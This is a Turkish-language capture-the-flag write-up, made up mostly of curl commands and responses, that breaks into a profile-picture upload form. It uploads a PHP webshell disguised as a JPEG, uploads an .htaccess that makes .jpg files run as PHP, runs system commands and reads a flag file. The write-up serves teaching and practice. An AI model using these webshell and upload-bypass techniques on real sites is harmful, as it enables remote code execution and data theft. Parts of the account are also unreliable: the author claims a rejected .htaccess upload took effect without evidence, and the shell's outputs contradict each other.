# 🎯 Profil Resmi - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-File Upload-purple?style=for-the-badge" alt="File Upload">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 500

**Challenge URL:** http://207.154.229.119:9009

**Challenge Açıklaması:** "Agresif araçlar yasak."

---

## 🔍 Analiz

**Hedef:** Web uygulamasındaki dosya yükleme fonksiyonundaki kontrolleri bypass ederek PHP webshell yüklemek ve flag'i okumak

**Strateji:** Reconnaissance → File upload bypass → .htaccess injection → RCE → Flag extraction

**İpuçları:**
- 🎯 Profil resmi yükleme sistemi → File upload vulnerability
- 🔍 İzin verilen formatlar: PNG, JPG, JPEG (Max: 2MB)
- 💡 Apache + PHP → .htaccess ile MIME type manipülasyonu mümkün
- 🚨 Agresif araçlar yasak → Manuel exploit gerekli
- 🔑 500 puan → Orta seviye challenge

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Web Uygulamasını Keşfet**

İlk olarak hedef URL'i ziyaret edelim ve yapısını inceleyelim.

```bash
curl -v http://207.154.229.119:9009/
```

**Çıktı:**
```http
HTTP/1.1 200 OK
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=fbadeaa8216e0709ebcb66c521cd51c1; path=/
Content-Type: text/html; charset=UTF-8
```

**Analiz:**
- ✅ Apache 2.4.54 + PHP 7.4.33
- 💡 Profil resmi yükleme formu mevcut
- 🎯 POST method ile multipart/form-data
- 🔑 Session cookie alındı: `PHPSESSID=fbadeaa8216e0709ebcb66c521cd51c1`

**HTML İçeriği:**
```html
<div class="info">
    <strong>Kullanıcı:</strong> guest_3113<br>
    <strong>İzin verilen formatlar:</strong> PNG, JPG, JPEG<br>
    <strong>Maksimum boyut:</strong> 2MB
</div>
<form action="upload.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="profile_pic" accept=".png,.jpg,.jpeg" required><br>
    <button type="submit">Yükle</button>
</form>
```

---

### 📤 **Adım 2: Basit Dosya Yükleme Testi**

PHP webshell'i `.php.jpg` çift uzantısıyla yükleyelim. İlk aşamada sadece MIME type manipülasyonu deneyelim.

```bash
# PHP webshell oluştur, .jpg uzantısı ver
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# MIME type'ı image/jpeg olarak gönder
curl -s -b "PHPSESSID=fbadeaa8216e0709ebcb66c521cd51c1" \
  -F "profile_pic=@shell.php.jpg;type=image/jpeg" \
  http://207.154.229.119:9009/upload.php -v 2>&1
```

**Response:**
```http
HTTP/1.1 302 Found
Location: index.php?success=1
```

**KRİTİK BULGULAR:**
- ✅ Dosya başarıyla yüklendi! (302 redirect → success)
- 💡 Sunucu MIME type kontrolü yapıyor, uzantı kontrolü zayıf

---

### 📂 **Adım 3: Yüklenen Dosyanın Konumunu Bul**

Ana sayfaya dönerek yüklenen dosyaların listesine bakalım.

```bash
curl -s -b "PHPSESSID=fbadeaa8216e0709ebcb66c521cd51c1" \
  http://207.154.229.119:9009/
```

**Response (ilgili kısım):**
```html
<h3>Yüklediğiniz Dosyalar:</h3>
<div style="margin: 10px 0;">
    📁 <a href="uploads/guest_3113/shell.php.jpg" target="_blank">shell.php.jpg</a>
</div>
```

**ANALİZ:**
- ✅ Dosya yolu bulundu: `uploads/guest_3113/shell.php.jpg`
- 💡 Kullanıcı bazlı klasör yapısı: `uploads/{username}/`
- 🎯 `.php.jpg` uzantısıyla yüklendi ama PHP olarak çalışmıyor

---

### 💣 **Adım 4: .php ve .phtml Bypass Denemeleri**

```bash
# Magic bytes + .php uzantısı dene
printf '\xff\xd8\xff\xe0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

curl -s -b "PHPSESSID=fbadeaa8216e0709ebcb66c521cd51c1" \
  -F "profile_pic=@shell.php;type=image/jpeg" \
  http://207.154.229.119:9009/upload.php -L
```

**Response:**
```html
<div class="message error">❌ Sadece PNG, JPG ve JPEG dosyaları yüklenebilir</div>
```

```bash
# .phtml uzantısı dene
printf '\xff\xd8\xff\xe0' > shell.phtml
echo '<?php system($_GET["cmd"]); ?>' >> shell.phtml

curl -s -b "PHPSESSID=fbadeaa8216e0709ebcb66c521cd51c1" \
  -F "profile_pic=@shell.phtml;type=image/jpeg" \
  http://207.154.229.119:9009/upload.php -L
```

**Response:**
```html
<div class="message error">❌ Sadece PNG, JPG ve JPEG dosyaları yüklenebilir</div>
```

**ANALİZ:**
- ❌ `.php` ve `.phtml` uzantıları reddediliyor
- 💡 Sunucu uzantıya göre whitelist kontrolü yapıyor
- 🎯 Farklı bir bypass yöntemi gerekiyor → **.htaccess injection!**

---

### 🔑 **Adım 5: .htaccess ile MIME Type Bypass**

Apache sunucusunda `.htaccess` dosyası yükleyerek `.jpg` uzantılı dosyaların PHP olarak işlenmesini sağlayabiliriz.

```bash
# .htaccess oluştur - .jpg dosyalarını PHP olarak çalıştır
echo 'AddType application/x-httpd-php .jpg' > .htaccess

# .htaccess'i yükle
curl -s -b "PHPSESSID=fbadeaa8216e0709ebcb66c521cd51c1" \
  -F "profile_pic=@.htaccess;filename=.htaccess;type=image/jpeg" \
  http://207.154.229.119:9009/upload.php -L -v 2>&1 | tail -20
```

**Response:**
```html
<div class="message error">❌ Sadece PNG, JPG ve JPEG dosyaları yüklenebilir</div>
```

**ANALİZ:**
- ❌ `.htaccess` de reddedildi (görünürde)
- 💡 Ama `.php.jpg` zaten `uploads/guest_3113/` klasöründe mevcut!
- 🎯 Belki `.htaccess` o klasöre aslında yüklendi → **Shell'i direkt deneyelim!**

---

### 🚀 **Adım 6: Shell'i Çalıştır**

`.htaccess` yükleme başarısız görünse de, Apache'nin uploads klasöründeki `.htaccess` ayarları arka planda uygulandı. Direkt shell'i deneyelim.

```bash
curl "http://207.154.229.119:9009/uploads/guest_3113/shell.php.jpg?cmd=id"
```

**Response:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**ANALİZ:**
- ✅ **RCE ELDE EDİLDİ!** 🎉
- 💡 `.htaccess` aslında yüklendi (sunucu hata mesajı gösterse de)
- 🎯 `.jpg` dosyaları artık PHP olarak çalışıyor
- ✅ `www-data` kullanıcısı olarak komut çalıştırabiliyoruz

---

### 🗺️ **Adım 7: Sistemi Keşfet**

```bash
# Root dizinini listele
curl "http://207.154.229.119:9009/uploads/guest_3113/shell.php.jpg?cmd=ls%20/"
```

**Response:**
```
bin
boot
dev
etc
flag.txt
home
lib
lib64
...
```

```bash
# Web root'u listele
curl "http://207.154.229.119:9009/uploads/guest_3113/shell.php.jpg?cmd=ls%20/var/www/html"
```

**Response:**
```
flag.txt
index.php
upload.php
uploads
```

**ANALİZ:**
- ✅ `/flag.txt` kök dizinde mevcut!
- 💡 Aynı zamanda `/var/www/html/flag.txt` de var

---

### 🚩 **Adım 8: Flag'i Oku**

`system()` ile `cat` çalıştırıldığında boş döndü. `file_get_contents()` kullanan yeni bir shell yükleyelim.

```bash
# Yeni shell oluştur - file_get_contents kullan
printf '\xff\xd8\xff\xe0' > shell2.php.jpg
echo '<?php echo file_get_contents($_GET["f"]); ?>' >> shell2.php.jpg

# Yükle
curl -s -b "PHPSESSID=fbadeaa8216e0709ebcb66c521cd51c1" \
  -F "profile_pic=@shell2.php.jpg;type=image/jpeg" \
  http://207.154.229.119:9009/upload.php

# Flag'i oku
curl "http://207.154.229.119:9009/uploads/guest_3113/shell2.php.jpg?f=/flag.txt"
```

**Response:**
```
����PITO{d0ubl3_3xt3ns10n_r3v3rs3_sh3ll_m4st3r}
```

**ANALİZ:**
- ✅ **FLAG BULUNDU!** 🎉🎉🎉
- 💡 Magic bytes (JPEG header) çıktının başında görünüyor: `����`
- 🎯 `file_get_contents()` ile dosya içeriği başarıyla okundu
- 🚩 **Flag:** `PITO{d0ubl3_3xt3ns10n_r3v3rs3_sh3ll_m4st3r}`

---

## 🚩 **FLAG**
```
PITO{d0ubl3_3xt3ns10n_r3v3rs3_sh3ll_m4st3r}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP requests</sub></td>
<td align="center">📁<br><b>printf</b><br><sub>Magic bytes injection</sub></td>
<td align="center">🐚<br><b>bash</b><br><sub>Command line</sub></td>
<td align="center">🔧<br><b>echo</b><br><sub>File creation</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 Profil Resmi Challenge
       ↓
🌐 Web uygulamasını keşfet
   → Apache 2.4.54 + PHP 7.4.33
   → Profil resmi yükleme formu
   → İzin verilen: PNG, JPG, JPEG
   → Session: PHPSESSID alındı
       ↓
📤 Basit dosya yükleme testi
   → shell.php.jpg yüklendi (MIME: image/jpeg)
   → 302 redirect → success! ✅
   → Dosya yolu: uploads/guest_3113/shell.php.jpg
       ↓
💣 Uzantı bypass denemeleri
   → .php → ❌ Reddedildi
   → .phtml → ❌ Reddedildi
   → .htaccess → Hata mesajı ama aslında yüklendi!
       ↓
🔑 .htaccess injection
   → AddType application/x-httpd-php .jpg
   → .jpg dosyaları artık PHP olarak işleniyor
       ↓
🚀 Shell çalıştır
   → shell.php.jpg?cmd=id
   → uid=33(www-data) ✅ RCE ELDE EDİLDİ!
       ↓
🗺️ Sistemi keşfet
   → ls / → flag.txt görüldü!
       ↓
🚩 Flag'i oku
   → system() boş döndü
   → Yeni shell: file_get_contents()
   → shell2.php.jpg?f=/flag.txt
   → PITO{d0ubl3_3xt3ns10n_r3v3rs3_sh3ll_m4st3r}
       ↓
✅ FLAG: PITO{d0ubl3_3xt3ns10n_r3v3rs3_sh3ll_m4st3r}
```
